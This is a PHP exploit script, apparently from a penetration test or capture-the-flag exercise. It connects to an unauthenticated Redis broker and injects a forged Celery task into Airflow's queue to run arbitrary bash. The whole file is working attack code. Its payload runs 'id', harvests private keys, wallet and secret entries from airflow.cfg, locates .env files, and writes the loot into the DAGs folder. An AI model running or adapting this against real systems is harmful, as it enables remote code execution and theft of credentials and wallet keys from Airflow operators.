<?php
$s=fsockopen("172.18.0.3",6379,$e,$m,5);
if(!$s){echo "FAIL:$m\n";exit;}
fwrite($s,"PING\r\n");
echo "P:".trim(fgets($s))."\n";

$tid=uniqid("celery",true);

// Simple command — just write id output
$cmd_arr = array("bash", "-c", "id > /opt/airflow/dags/_victory.txt 2>&1; ls -la /opt/airflow/dags/ >> /opt/airflow/dags/_victory.txt 2>&1; cat /opt/airflow/config/airflow.cfg 2>/dev/null | grep -i 'private\|key\|wallet\|secret\|0x' >> /opt/airflow/dags/_victory.txt 2>&1; find /opt/airflow -name '.env' >> /opt/airflow/dags/_victory.txt 2>&1; echo VICTORY >> /opt/airflow/dags/_victory.txt");

// Celery body format: [[args], {kwargs}, {options}]
$body = array($cmd_arr, (object)array(), (object)array());
$body_json = json_encode($body);
$body_b64 = base64_encode($body_json);

$headers = array(
    "lang" => "py",
    "task" => "airflow.executors.celery_executor.execute_command",
    "id" => $tid,
    "shadow" => null,
    "eta" => null,
    "expires" => null,
    "group" => null,
    "group_index" => null,
    "retries" => 0,
    "timelimit" => array(null, null),
    "root_id" => $tid,
    "parent_id" => null,
    "argsrepr" => "(cmd,)",
    "kwargsrepr" => "{}",
    "origin" => "gen1@injected",
    "ignore_result" => false
);

$properties = array(
    "correlation_id" => $tid,
    "reply_to" => $tid,
    "delivery_mode" => 2,
    "delivery_info" => array("exchange" => "", "routing_key" => "default"),
    "priority" => 0,
    "body_encoding" => "base64",
    "delivery_tag" => $tid
);

$msg = json_encode(array(
    "body" => $body_b64,
    "content-encoding" => "utf-8",
    "content-type" => "application/json",
    "headers" => $headers,
    "properties" => $properties
));

$l = strlen($msg);
$redis_cmd = "*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$".$l."\r\n".$msg."\r\n";
fwrite($s, $redis_cmd);
echo "L:".trim(fgets($s))."\n";

// Check queue length
sleep(2);
fwrite($s, "LLEN default\r\n");
echo "Q:".trim(fgets($s))."\n";

echo "T:".$tid."\n";
echo "BODY:".$body_json."\n";
fclose($s);
